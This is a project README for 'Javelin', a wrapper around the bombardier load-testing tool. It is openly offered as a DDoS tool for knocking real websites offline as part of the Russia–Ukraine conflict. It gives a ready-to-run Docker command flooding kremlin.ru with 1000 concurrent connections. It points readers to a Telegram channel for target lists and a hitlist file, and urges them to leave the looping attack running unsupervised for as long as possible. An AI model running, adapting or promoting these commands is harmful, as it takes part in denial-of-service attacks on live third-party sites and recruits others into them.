# Javelin 🚀

🇺🇦 A DDoS helper tool to bring down enemy websites - based on [bombardier](https://github.com/codesenberg/bombardier) for long-term unsupervised execution 🇺🇦  

### [Інструкція українською](./README_UA.md)
### [Инструкция на русском](./README_RU.md)

### Simplified instruction - manual execution
- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- `docker run -it alpine/bombardier -c 1000 -d 60s -l https://kremlin.ru`
- Last part of the comand is host url, you should pick one [from the last chat messages](https://t.me/itarmyofukraine2022)  

Automatic script performs the same command and loops through a list of hosts, so you can leave it unsupervised overnight or for long periods of time. It also automatically fetches updates to the list.

### Get the code
- Clone the repo - `git clone https://github.com/v1adko/javelin.git`   
  or  
[download a zip](https://github.com/v1adko/javelin/archive/refs/heads/master.zip) if git clone is taking too long
- Change working directory - `cd ./javelin`
- Optionally update [the targets](#targets)

### Targets

Best update targets from [this telegram channel](https://t.me/itarmyofukraine2022)  
Edit contents of the [./hitlist.sh](/hitlist.sh) file

### Run in Docker

*Note*: this could take quite some time, if you're tech-savvy enough,  
try [installing binaries manually](#local) directly on your host system,  
it should be faster

- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- Optionally update [the targets](#targets)
- `docker-compose up --build` (on some systems compose is not installed with docker)
   **or**
- `docker build -t javelin .`
- `docker run javelin`

### Local

- Install Go - [Instructions](https://go.dev/doc/install)
- Install bombardier [by downloading a binary](https://github.com/codesenberg/bombardier/releases)
- Run `./javelin-local.sh`

### Run

Now leave the process running for as much as you can
Thank you for fighting on our side! 💪 🇺🇦
